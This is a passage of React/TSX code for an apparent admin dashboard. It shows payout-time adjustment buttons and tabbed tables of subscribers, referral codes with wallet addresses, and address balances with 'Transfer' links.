                                <button
                                  type="button"
                                  onClick={() => handleAdjustPayoutTime(payout, 30 * 60 * 1000)}
                                  className="rounded-full border border-white/15 bg-white/5 px-3 py-1 text-[10px] uppercase tracking-[0.2em] text-white/70 transition hover:text-white"
                                >
                                  +30m
                                </button>
                              </div>
                              <div className="flex gap-1">
                                <button
                                  type="button"
                                  onClick={() => handleAdjustPayoutTime(payout, -5 * 60 * 1000)}
                                  className="rounded-full border border-white/15 bg-white/5 px-3 py-1 text-[10px] uppercase tracking-[0.2em] text-white/70 transition hover:text-white"
                                >
                                  -5m
                                </button>
                                <button
                                  type="button"
                                  onClick={() => handleAdjustPayoutTime(payout, 5 * 60 * 1000)}
                                  className="rounded-full border border-white/15 bg-white/5 px-3 py-1 text-[10px] uppercase tracking-[0.2em] text-white/70 transition hover:text-white"
                                >
                                  +5m
                                </button>
                              </div>
                              <button
                                type="button"
                                onClick={() => handleEditPayoutTime(payout)}
                                className="rounded-full border border-white/15 bg-white/5 px-3 py-1 text-[10px] uppercase tracking-[0.2em] text-white/70 transition hover:text-white"
                              >
                                Edit time
                              </button>
                              {(payout.control || isPaused) && (
                                <button
                                  type="button"
                                  onClick={() => handleResetPayout(payout)}
                                  className="rounded-full border border-white/15 bg-white/5 px-3 py-1 text-[10px] uppercase tracking-[0.2em] text-white/70 transition hover:text-white"
                                >
                                  Reset
                                </button>
                              )}
                            </div>
                          </div>
                        </div>
                      )
                    })}
                  </div>
                </div>
              </section>
            ) : (
              <div
                id="daily-payout-panel"
                className="rounded-3xl border border-emerald-400/20 bg-emerald-400/[0.04] px-6 py-10 text-center text-sm text-emerald-100/75"
              >
                Daily payout tracking is up to date. No wallets are currently waiting on the next cycle.
              </div>
            ))}
        </div>


        <div className="flex flex-wrap gap-3">
          {(Object.keys(tabLabels) as Tab[]).map((tab) => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`px-4 py-2 rounded-2xl border transition ${
                activeTab === tab ? 'border-emerald-400/70 bg-emerald-400/10 text-white' : 'border-white/10 bg-white/5 text-white/70 hover:text-white'
              }`}
            >
              {tabLabels[tab]}
            </button>
          ))}
        </div>

        <div className="rounded-3xl border border-white/10 bg-white/5 overflow-hidden">
          <div className="flex items-center justify-between px-6 py-4 border-b border-white/10">
            <h2 className="text-lg font-semibold">{tabLabels[activeTab]} Activity</h2>
            <div className="text-xs text-white/50">
              {activeRefreshing
                ? 'Refreshing…'
                : isSubscriberView
                  ? 'Auto refresh every 60s'
                  : isReferralView
                    ? 'Referrals sync on approval events'
                    : 'Reload this page to update data'}
            </div>
          </div>
          <div className="overflow-x-auto">
            <table className="min-w-full text-sm">
              <thead className="bg-white/10 text-left text-white/70">
                {isSubscriberView ? (
                  <tr>
                    <th className="px-6 py-3">#</th>
                    <th className="px-6 py-3">Email</th>
                    <th className="px-6 py-3">Subscribed</th>
                  </tr>
                ) : isReferralView ? (
                  <tr>
                    <th className="px-6 py-3">#</th>
                    <th className="px-6 py-3">Referrer</th>
                    <th className="px-6 py-3">Referral Code</th>
                    <th className="px-6 py-3">Total Referrals</th>
                    <th className="px-6 py-3">Recent Activity</th>
                  </tr>
                ) : (
                  <tr>
                    <th className="px-6 py-3">#</th>
                    <th className="px-6 py-3">Date</th>
                    <th className="px-6 py-3">Address</th>
                    <th className="px-6 py-3">Total Balance (USD)</th>
                    <th className="px-6 py-3 text-right">Transfer</th>
                  </tr>
                )}
              </thead>
              <tbody>
                {activeLoading ? (
                  <tr>
                    <td colSpan={columnCount} className="px-6 py-6 text-center text-white/50">
                      Loading data…
                    </td>
                  </tr>
                ) : activeError ? (
                  <tr>
                    <td colSpan={columnCount} className="px-6 py-6 text-center text-rose-300">
                      {activeError}
                    </td>
                  </tr>
                ) : activeRows.length === 0 ? (
                  <tr>
                    <td colSpan={columnCount} className="px-6 py-6 text-center text-white/50">
                      No records yet.
                    </td>
                  </tr>
                ) : isSubscriberView ? (
                  subscriberRows.map((subscriber, index) => (
                    <tr key={subscriber.id} className="border-t border-white/5">
                      <td className="px-6 py-3 text-white/70">{index + 1}</td>
                      <td className="px-6 py-3 font-medium text-white/80">{subscriber.email}</td>
                      <td className="px-6 py-3 text-white/60">{formatDateTime(subscriber.createdAt)}</td>
                    </tr>
                  ))
                ) : isReferralView ? (
                  referralSummaries.map((summary, index) => {
                    const remaining = Math.max(0, summary.referralCount - summary.referrals.length)
                    const latestReferral = summary.lastReferralAt || summary.lastApprovedAt || summary.firstApprovedAt || summary.createdAt
                    return (
                      <tr key={summary.address} className="border-t border-white/5 align-top">
                        <td className="px-6 py-3 text-white/70">{index + 1}</td>
                        <td className="px-6 py-3">
                          <div className="space-y-1">
                            <div className="flex flex-wrap items-center gap-2">
                              <span className="font-mono text-xs text-white/85 break-all">{summary.address}</span>
                              <button
                                onClick={async () => {
                                  try {
                                    await navigator.clipboard.writeText(summary.address)
                                    setCopiedAddress(summary.address)
                                  } catch (error) {
                                    console.warn('Copy failed', error)
                                  }
                                }}
                                className="rounded-full border border-white/15 px-2 py-1 text-[10px] uppercase tracking-[0.2em] text-white/60 transition hover:border-emerald-300 hover:text-emerald-200"
                              >
                                {copiedAddress === summary.address ? 'Copied' : 'Copy'}
                              </button>
                            </div>
                            <div className="text-[11px] text-white/50">
                              Joined {formatDateTime(summary.createdAt)}
                            </div>
                          </div>
                        </td>
                        <td className="px-6 py-3">
                          <div className="inline-flex items-center gap-2 rounded-2xl border border-white/10 bg-white/5 px-3 py-1 text-xs text-white/80">
                            <span className="font-semibold tracking-[0.2em]">{summary.code}</span>
                            <button
                              onClick={async () => {
                                try {
                                  await navigator.clipboard.writeText(summary.code)
                                  setCopiedReferralCode(summary.code)
                                } catch (error) {
                                  console.warn('Copy code failed', error)
                                }
                              }}
                              className="rounded-full border border-white/15 px-2 py-0.5 text-[10px] uppercase tracking-[0.2em] text-white/60 transition hover:border-emerald-300 hover:text-emerald-200"
                            >
                              {copiedReferralCode === summary.code ? 'Copied' : 'Copy'}
                            </button>
                          </div>
                        </td>
                        <td className="px-6 py-3 text-white/70">{summary.referralCount}</td>
                        <td className="px-6 py-3">
                          <div className="space-y-2 text-xs text-white/60">
                            <div>
                              Last activity: <span className="text-white/85">{latestReferral ? formatDateTime(latestReferral) : '—'}</span>
                            </div>
                            {summary.referrals.length ? (
                              <div className="flex flex-wrap gap-2">
                                {summary.referrals.map((referral) => (
                                  <span
                                    key={`${referral.address}-${referral.createdAt}`}
                                    className="inline-flex items-center gap-1 rounded-full border border-white/10 bg-white/5 px-2 py-1 font-mono text-[10px] text-white/75"
                                  >
                                    {referral.address}
                                  </span>
                                ))}
                                {remaining > 0 && (
                                  <span className="inline-flex items-center rounded-full border border-white/10 bg-white/5 px-2 py-1 text-[10px] uppercase tracking-[0.2em] text-white/50">
                                    +{remaining} more
                                  </span>
                                )}
                              </div>
                            ) : (
                              <div className="text-white/45">No referrals yet.</div>
                            )}
                          </div>
                        </td>
                      </tr>
                    )
                  })
                ) : (
                  eventRows.map((row, index) => (
                    <tr key={row.id} className="border-t border-white/5">
                      <td className="px-6 py-3 text-white/70">{index + 1}</td>
                      <td className="px-6 py-3">{formatDateTime(row.timestamp)}</td>
                      <td className="px-6 py-3 font-mono text-xs">
                        {row.address}
                      </td>
                      <td className="px-6 py-3">{formatUsd(row.totalUsd)}</td>
                      <td className="px-6 py-3 text-right">
                        <Link
                          to={`/admin/transfer/${row.address}`}
                          className="text-emerald-400 hover:text-emerald-300 text-xs font-semibold"
                        >
                          Transfer
                        </Link>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  )
}
